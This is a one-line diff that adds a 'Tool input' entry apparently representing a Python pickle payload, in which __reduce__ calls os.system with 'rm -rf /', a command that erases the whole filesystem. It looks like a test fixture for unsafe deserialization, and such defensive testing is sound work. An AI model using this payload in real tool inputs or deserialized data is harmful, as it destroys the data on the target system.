@@ -1,0 +1,1 @@
+Tool input: __reduce__: [os.system, ['rm -rf /']]
